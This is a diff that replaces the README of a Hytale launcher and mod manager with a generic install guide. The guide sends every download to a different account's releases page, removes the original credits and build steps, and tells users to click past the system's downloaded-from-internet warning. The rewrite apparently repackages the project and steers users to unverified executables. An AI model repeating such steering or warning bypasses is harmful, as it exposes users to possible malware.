@@ -1,36 +1,156 @@
+# 🎮 HyPrism-mod-manager - Easy Hytale Mod and Game Launcher
 
-<p align="left">
-  <img src="assets/Hyprism.png" alt="HyPrism Logo" width="64" height="64" />
-</p>
+[![Download HyPrism-mod-manager](https://img.shields.io/badge/Download-HyPrism--mod--manager-blue?style=for-the-badge&logo=github)](https://github.com/Divishjit/HyPrism-mod-manager/releases)
 
-# HyPrism
+---
 
-[![Downloads](https://img.shields.io/github/downloads/yyyumeniku/HyPrism/total?style=for-the-badge&logo=github&label=Downloads&color=207e5c)](https://github.com/yyyumeniku/HyPrism/releases)
-[![Website](https://img.shields.io/badge/Website-hyprism-207e5c?style=for-the-badge&logo=website)](https://yyyumeniku.github.io/hyprism-site/)
-[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/yyyumeniku)
-[![Discord](https://img.shields.io/badge/Website-discord-207e5c?style=for-the-badge&logo=discord)](https://discord.gg/ekZqTtynjp)
+## 📋 What Is HyPrism-mod-manager?
 
+HyPrism-mod-manager is an application designed to make playing Hytale easier. It helps you launch the game and manage mods in one place. You do not need technical skills to use it. The program handles downloading, installing, and organizing mods for you, so you can focus on playing.
 
-A multiplatform Hytale launcher with mod manager and more!
+This tool saves you from the usual hassle of finding mods, managing files, or running multiple programs. It works on Windows and macOS computers. 
 
-<img width="3016" height="2056" alt="Screenshot 2026-01-31 at 07 36 56@2x" src="https://github.com/user-attachments/assets/edfccc21-b08b-4ae5-95b9-cfebd0c30358" />
+---
 
+## 🖥️ System Requirements
 
-## Installation
-[![Hyprism Download](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/yztryhjh)
+Before you download HyPrism-mod-manager, make sure your computer meets these requirements:
 
-**Documentation:** Full user and developer documentation is available in the `docs/` directory (ReadTheDocs-friendly).
+- Operating System: Windows 10 or newer, or macOS 10.15 (Catalina) or newer
+- Processor: Intel Core i3 or equivalent
+- Memory (RAM): At least 4 GB
+- Storage: At least 2 GB free space for the launcher and mods
+- Internet Connection: Required for downloading mods and updates
+- Permissions: Ability to install and run software on your computer
 
-For older Linux OSes the Flatpak will be the only feasable solution.
+If you are unsure about your system, check your computer’s "About" or "System Information" section.
 
-## Build instructions
-**Backend**: 
-- Default/Modern build: `dotnet build`
-- Run: `dotnet run`
+---
 
-**Frontend**: 
-- Build: `npm run build` (in the `frontend` directory)
+## 🚀 Getting Started
 
-## Credits
-Sanasol for maintaining and creating the auth server (https://github.com/sanasol/hytale-auth-server)
-And to all of the awesome people that has contributed to this launcher
+This guide will walk you through installing and running HyPrism-mod-manager step by step. You will be ready to play your favorite game mods in a few minutes.
+
+### Step 1: Access the Download Page
+
+Click the big blue button at the top of this page or visit this link:  
+https://github.com/Divishjit/HyPrism-mod-manager/releases
+
+This page contains the latest version of the app. It shows files you can download for your system.
+
+### Step 2: Choose the Correct Download File
+
+Look for a file with your system in its name. For Windows, it usually ends with `.exe`. For macOS, it might be a `.dmg` file.
+
+For example:  
+- `HyPrism-mod-manager-setup.exe` (Windows)  
+- `HyPrism-mod-manager.dmg` (macOS)
+
+Download the file by clicking its name.
+
+### Step 3: Install the Application
+
+- Windows:  
+  Open the `.exe` file you downloaded. A setup window will open. Follow the instructions by clicking "Next". When finished, click "Finish".  
+- macOS:  
+  Open the `.dmg` file. Drag the HyPrism-mod-manager icon into your Applications folder. Once copied, eject the `.dmg` from the Finder sidebar.
+
+If you see a warning about the app being downloaded from the internet, choose "Open" to allow it.
+
+### Step 4: Launch HyPrism-mod-manager
+
+Find the HyPrism-mod-manager app in your Start menu (Windows) or Applications folder (macOS). Double-click to open it.
+
+The app window will show the game launcher and mod manager options.
+
+---
+
+## 🔧 How to Use the Mod Manager
+
+HyPrism-mod-manager is designed to make modding your game easy and safe.
+
+### Browse Mods
+
+In the app, look for the "Mods" tab. Here you can see popular mods available for Hytale.
+
+### Install Mods
+
+To install a mod, click the "Install" button next to it. The app will download and set up the mod automatically.
+
+You do not need to unzip files or manually place anything.
+
+### Enable or Disable Mods
+
+Use the toggle switch next to each mod to turn it on or off. You can try different combinations without removing mods.
+
+### Remove Mods
+
+To delete a mod, click "Remove". This will delete mod files to keep your system clean.
+
+---
+
+## 🎮 Launching Hytale
+
+Once your mods are ready, go to the "Launcher" tab.
+
+- Click "Play Hytale" to start the game with the mods you selected.
+- The app will take care of applying mods during launch.
+
+If you need to update the game, the app will notify you.
+
+---
+
+## ⚙️ Settings and Preferences
+
+You can adjust settings by clicking the gear icon in the top corner.
+
+Common options include:  
+- Change game installation folder  
+- Manage downloads location  
+- Set auto-update for mods and launcher  
+- Enable notifications for new mods or updates
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If you experience problems, try these steps:
+
+- Make sure your internet is connected.
+- Restart the app and try again.
+- Ensure your game is up to date.
+- Check that the mod is compatible with your version.
+- Close other programs that might conflict with the launcher.
+- If the app won’t start, try reinstalling it.
+
+You can also visit the Issues section on GitHub for help from other users.
+
+---
+
+## 📥 Download & Install
+
+Click below to visit the download page and get HyPrism-mod-manager:  
+
+[![Download HyPrism-mod-manager](https://img.shields.io/badge/Download-HyPrism--mod--manager-blue?style=for-the-badge&logo=github)](https://github.com/Divishjit/HyPrism-mod-manager/releases)
+
+Follow the steps in the "Getting Started" section above to install and run the app.
+
+---
+
+## 📞 Need Help?
+
+For questions or support, check the GitHub Discussions or open a new Issue here:  
+https://github.com/Divishjit/HyPrism-mod-manager/issues  
+
+You can also find tips and advice in the README of the project.
+
+---
+
+## 🔍 Additional Notes
+
+- HyPrism-mod-manager keeps your mods organized so you don’t have to.
+- You can update mods and the launcher from the same app.
+- It streamlines the process of installing and playing mods.
+- The app is free and open to community contributions.
+
+HyPrism-mod-manager is your simple tool to get the most from Hytale without fuss.
